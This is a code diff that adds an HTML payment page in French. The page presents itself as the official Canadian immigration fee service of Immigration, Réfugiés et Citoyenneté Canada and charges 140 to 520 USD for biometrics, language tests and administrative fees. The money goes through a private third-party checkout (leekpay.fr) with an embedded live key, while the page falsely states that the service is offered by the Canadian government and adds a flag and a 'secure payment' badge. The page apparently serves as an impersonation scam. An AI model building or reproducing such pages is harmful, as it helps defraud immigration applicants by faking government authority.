@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Paiement immigration Canada</title>
+
+<style>
+body{
+  font-family:Arial;
+  background:
+    linear-gradient(rgba(0,0,0,0.6),rgba(0,0,0,0.6)),
+    url("background.jpg") no-repeat center;
+  background-size:cover;
+
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  align-items:center;
+
+  min-height:100vh;
+  margin:0;
+}
+
+.box{
+  background:white;
+  padding:30px;
+  border-radius:12px;
+  width:350px;
+  text-align:center;
+  box-shadow:0 0 15px rgba(0,0,0,0.2);
+  margin-bottom:20px;
+}
+
+.logo{
+  width:120px;
+  margin-bottom:10px;
+}
+
+select,button{
+  width:100%;
+  padding:12px;
+  margin-top:10px;
+  border-radius:6px;
+  border:1px solid #ccc;
+}
+
+button{
+  background:#00bcd4;
+  color:white;
+  border:none;
+  font-weight:bold;
+  cursor:pointer;
+}
+
+button:hover{
+  background:#0097a7;
+}
+
+#amount{
+  margin-top:10px;
+  font-weight:bold;
+  color:#333;
+}
+
+.footer{
+  text-align:center;
+  color:white;
+  font-size:12px;
+}
+
+.footer img{
+  width:30px;
+  margin-top:5px;
+}
+</style>
+
+<script src="https://leekpay.fr/js/leekpay.js"></script>
+
+</head>
+
+<body>
+
+<div class="box">
+
+<img src="logo.png" class="logo">
+
+<h3>Paiement immigration Canada</h3>
+
+<select id="service" onchange="updateAmount()">
+  <option value="150">1 - Demande biométrique - 150 USD</option>
+  <option value="140">2 - Test de langue - 140 USD</option>
+  <option value="230">3 - Droit administratif - 230 USD</option>
+  <option value="520">4 - Toutes les procédures - 520 USD</option>
+</select>
+
+<p id="amount"></p>
+
+<button onclick="payer()">Payer</button>
+
+<p style="font-size:12px; margin-top:10px;">
+Après avoir cliqué sur "Payer", vous serez redirigé vers une page sécurisée pour confirmer votre paiement.
+</p>
+
+<p style="font-size:11px; margin-top:10px;">
+Ce service de paiement est offert par le gouvernement canadien.
+</p>
+
+</div>
+
+<!-- SIGNATURE -->
+<div class="footer">
+  <p>© 2026 Immigration, Réfugiés et Citoyenneté Canada</p>
+  <p>Plateforme du gouvernement canadien • Paiement sécurisé 🔒</p>
+  <img src="https://upload.wikimedia.org/wikipedia/en/c/cf/Flag_of_Canada.svg">
+</div>
+
+<script>
+
+function updateAmount(){
+  let usd = service.value;
+  amount.innerText = "Montant à payer : " + usd + " USD";
+}
+
+function payer(){
+
+  let usd = parseFloat(service.value);
+
+  LeekPay.checkout({
+    amount: usd,
+    currency: "USD",
+    apiKey: "pk_live_OIf3UkphEVWIVAJdd7VB6KWEm7IBuDwK"
+  });
+
+}
+
+updateAmount();
+
+</script>
+
+</body>
+</html>
